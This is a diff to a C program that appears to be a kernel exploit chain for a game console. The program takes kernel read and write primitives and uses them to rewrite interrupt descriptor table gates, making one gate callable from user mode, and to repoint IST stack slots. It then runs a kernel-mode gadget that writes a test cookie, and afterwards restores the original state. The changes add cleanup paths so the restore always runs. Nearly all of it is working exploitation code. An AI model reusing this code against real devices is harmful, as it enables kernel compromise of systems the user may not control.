@@ -263,99 +263,154 @@ int main(int argc, char **argv)
     }
 
     /* [C5] the minimal patch: 2 gates + 2 IST slots, cpu 0 only,
-     * single-qword writes, gate hi first / lo last. */
+     * single-qword writes, gate hi first / lo last.
+     *
+     * PATCH-LIFECYCLE RULE (from the owner's review question): after the
+     * FIRST patch write lands, NO failure path may exit without the full
+     * best-effort restore. patch_started is set after the first write;
+     * every failure goes to cleanup, which restores all six slots (each
+     * write individually checked and reported, none able to abort the
+     * others) and verifies the restore - a failed restore prints the
+     * POWER-CYCLE instruction loudly. The one unfixable case: a hard
+     * freeze inside run_in_kernel itself (the machine dies mid-machinery
+     * with the patch live) - the accepted deliberate-entry risk. */
+    int patch_started = 0;
+    int rc_final = 0;
+    unsigned char chk[16];
+    uint64_t c_lo, c_hi, c_ist3, c_ist4;
+    uint64_t got = 0;
+    int ok9 = 0, ok1 = 0, oki = 0;
+
     uint64_t n9_lo, n9_hi, n1_lo, n1_hi;
     gate_encode(pivot, kcs, 3, 0xE, 3, 1, &n9_lo, &n9_hi); /* v9: DPL3! */
     gate_encode(pivot, kcs, 4, 0xE, 0, 1, &n1_lo, &n1_hi); /* v1: DPL0 */
     uint64_t ist3v = cave + 0xe0;
     uint64_t ist4v = cave + 0x1f0;
-    if(copyin(gate9 + 8, &n9_hi, 8) != 8 || copyin(gate9, &n9_lo, 8) != 8 ||
-       copyin(gate1 + 8, &n1_hi, 8) != 8 || copyin(gate1, &n1_lo, 8) != 8 ||
-       copyin(ist3_cpu0, &ist3v, 8) != 8 || copyin(ist4_cpu0, &ist4v, 8) != 8) {
-        printf("[C5] FAIL: patch copyins\n");
-        fflush(stdout);
-        return 6;
-    }
-    /* readback verify */
-    unsigned char chk[16];
-    uint64_t c_lo, c_hi, c_ist3, c_ist4;
+
+#define PW(addr, val, tag) do { \
+        if(copyin((addr), &(val), 8) != 8) { \
+            printf("[C5] FAIL: patch write " tag "\n"); \
+            fflush(stdout); rc_final = 6; goto cleanup; \
+        } \
+        if(!patch_started) patch_started = 1; \
+    } while(0)
+
+    PW(gate9 + 8, n9_hi, "gate9 hi");
+    PW(gate9, n9_lo, "gate9 lo");
+    PW(gate1 + 8, n1_hi, "gate1 hi");
+    PW(gate1, n1_lo, "gate1 lo");
+    PW(ist3_cpu0, ist3v, "ist3");
+    PW(ist4_cpu0, ist4v, "ist4");
+#undef PW
+
+    /* readback verify - a failure here ALSO goes to cleanup (the state is
+     * fully patched; the restore must run before exiting) */
     copyout(chk, gate9, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
     if(c_lo != n9_lo || c_hi != n9_hi) {
-        printf("[C5] FAIL: gate9 readback\n"); fflush(stdout); return 6;
+        printf("[C5] FAIL: gate9 readback\n"); fflush(stdout);
+        rc_final = 6; goto cleanup;
     }
     copyout(chk, gate1, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
     if(c_lo != n1_lo || c_hi != n1_hi) {
-        printf("[C5] FAIL: gate1 readback\n"); fflush(stdout); return 6;
+        printf("[C5] FAIL: gate1 readback\n"); fflush(stdout);
+        rc_final = 6; goto cleanup;
     }
     copyout(&c_ist3, ist3_cpu0, 8); copyout(&c_ist4, ist4_cpu0, 8);
     if(c_ist3 != ist3v || c_ist4 != ist4v) {
-        printf("[C5] FAIL: ist readback\n"); fflush(stdout); return 6;
+        printf("[C5] FAIL: ist readback\n"); fflush(stdout);
+        rc_final = 6; goto cleanup;
     }
     printf("[C5] patch verified (g9 g1 ist3 ist4) - ENTERING\n");
     fflush(stdout);
 
     /* [C6] the deliberate one-shot: run_in_kernel with the cookie target */
-    struct regs regs;
-    memset(&regs, 0, sizeof(regs));
-    regs.rax = COOKIE;
-    regs.rdi = cave + 0x600;            /* the cookie slot */
-    regs.rip = offsets.store_rax_rdi;   /* mov [rdi],rax; ret - live-proven */
-    regs.rsp = cave + 0x700;            /* scratch stack in the cave */
-    regs.eflags = 0x102;                /* IF | TF - the design's return path */
-    printf("[C6] run_in_kernel: rip=0x%llx rdi=0x%llx rax=0x%llx\n",
-           (unsigned long long)regs.rip, (unsigned long long)regs.rdi,
-           (unsigned long long)regs.rax);
-    fflush(stdout);
+    {
+        struct regs regs;
+        memset(&regs, 0, sizeof(regs));
+        regs.rax = COOKIE;
+        regs.rdi = cave + 0x600;            /* the cookie slot */
+        regs.rip = offsets.store_rax_rdi;   /* mov [rdi],rax; ret - live-proven */
+        regs.rsp = cave + 0x700;            /* scratch stack in the cave */
+        regs.eflags = 0x102;                /* IF | TF - the design's return path */
+        printf("[C6] run_in_kernel: rip=0x%llx rdi=0x%llx rax=0x%llx\n",
+               (unsigned long long)regs.rip, (unsigned long long)regs.rdi,
+               (unsigned long long)regs.rax);
+        fflush(stdout);
 
-    run_in_kernel(&regs);
+        run_in_kernel(&regs);
+    }
 
     printf("[C6] RETURNED from run_in_kernel\n");
     fflush(stdout);
 
-    /* [C7] verify the cookie */
-    uint64_t got = 0;
+    /* [C7] verify the cookie (a mismatch flags the result but NEVER skips
+     * the restore - control falls through to cleanup) */
     copyout(&got, cave + 0x600, 8);
     printf("[C7] cookie: got=0x%llx want=0x%llx %s\n",
            (unsigned long long)got, (unsigned long long)COOKIE,
            got == COOKIE ? "VERIFIED" : "MISMATCH");
     fflush(stdout);
+    if(got != COOKIE)
+        rc_final = 9;
 
-    /* [C8] restore everything - single-qword writes, lo first then hi */
-    if(copyin(gate9, &g9_lo, 8) != 8 || copyin(gate9 + 8, &g9_hi, 8) != 8 ||
-       copyin(gate1, &g1_lo, 8) != 8 || copyin(gate1 + 8, &g1_hi, 8) != 8 ||
-       copyin(ist3_cpu0, &ist3o, 8) != 8 || copyin(ist4_cpu0, &ist4o, 8) != 8) {
-        printf("[C8] FAIL: restore copyins\n");
+cleanup:
+    /* [C8] the best-effort restore - only if anything was written; each
+     * write individually checked and counted, NEVER aborted; then the
+     * readback verify. A failed restore = the loud power-cycle message. */
+    if(patch_started) {
+        int wfail = 0;
+        wfail += (copyin(gate9, &g9_lo, 8) != 8);
+        wfail += (copyin(gate9 + 8, &g9_hi, 8) != 8);
+        wfail += (copyin(gate1, &g1_lo, 8) != 8);
+        wfail += (copyin(gate1 + 8, &g1_hi, 8) != 8);
+        wfail += (copyin(ist3_cpu0, &ist3o, 8) != 8);
+        wfail += (copyin(ist4_cpu0, &ist4o, 8) != 8);
+
+        copyout(chk, gate9, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
+        ok9 = (c_lo == g9_lo && c_hi == g9_hi);
+        copyout(chk, gate1, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
+        ok1 = (c_lo == g1_lo && c_hi == g1_hi);
+        copyout(&c_ist3, ist3_cpu0, 8); copyout(&c_ist4, ist4_cpu0, 8);
+        oki = (c_ist3 == ist3o && c_ist4 == ist4o);
+
+        printf("[C8] restore: writes_failed=%d g9=%d g1=%d ist=%d\n",
+               wfail, ok9, ok1, oki);
         fflush(stdout);
-        return 8;
-    }
-    copyout(chk, gate9, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
-    int ok9 = (c_lo == g9_lo && c_hi == g9_hi);
-    copyout(chk, gate1, 16); memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
-    int ok1 = (c_lo == g1_lo && c_hi == g1_hi);
-    copyout(&c_ist3, ist3_cpu0, 8); copyout(&c_ist4, ist4_cpu0, 8);
-    int oki = (c_ist3 == ist3o && c_ist4 == ist4o);
-    printf("[C8] restore: g9=%d g1=%d ist=%d\n", ok9, ok1, oki);
-    fflush(stdout);
-
-    /* [C9] zero-back the cave */
-    memset(buf, 0, sizeof(buf));
-    for(uint64_t o = 0; o < CAVE_SZ; o += sizeof(buf)) {
-        size_t n = (CAVE_SZ - o < sizeof(buf)) ? (size_t)(CAVE_SZ - o)
-                                               : sizeof(buf);
-        if(copyin(cave + o, buf, n) != (ssize_t)n) {
-            printf("[C9] FAIL: zero-back at +%llx\n", (unsigned long long)o);
+        if(wfail || !ok9 || !ok1 || !oki) {
+            printf("[C8] !!! RESTORE INCOMPLETE - LIVE PATCHED STATE - "
+                   "POWER-CYCLE THE CONSOLE NOW !!!\n");
             fflush(stdout);
-            break;
+            if(rc_final == 0)
+                rc_final = 8;
         }
+    } else {
+        printf("[C8] nothing was patched - no restore needed\n");
+        fflush(stdout);
     }
-    printf("[C9] cave zeroed back\n");
-    fflush(stdout);
 
-    printf("[CX] minchain complete: cookie %s, restore %s - the client "
-           "verifies the console next\n",
+    /* [C9] zero-back the cave (best-effort; failures reported, not fatal) */
+    if(cave) {
+        memset(buf, 0, sizeof(buf));
+        for(uint64_t o = 0; o < CAVE_SZ; o += sizeof(buf)) {
+            size_t n = (CAVE_SZ - o < sizeof(buf)) ? (size_t)(CAVE_SZ - o)
+                                                   : sizeof(buf);
+            if(copyin(cave + o, buf, n) != (ssize_t)n) {
+                printf("[C9] FAIL: zero-back at +%llx (best-effort)\n",
+                       (unsigned long long)o);
+                fflush(stdout);
+                break;
+            }
+        }
+        printf("[C9] cave zeroed back\n");
+        fflush(stdout);
+    }
+
+    printf("[CX] minchain complete: cookie %s, restore %s, rc=%d - the "
+           "client verifies the console next\n",
            got == COOKIE ? "OK" : "FAILED",
-           (ok9 && ok1 && oki) ? "OK" : "FAILED");
+           (!patch_started || (ok9 && ok1 && oki)) ? "OK" : "INCOMPLETE",
+           rc_final);
     fflush(stdout);
 
-    return (got == COOKIE && ok9 && ok1 && oki) ? 0 : 9;
+    return rc_final;
 }
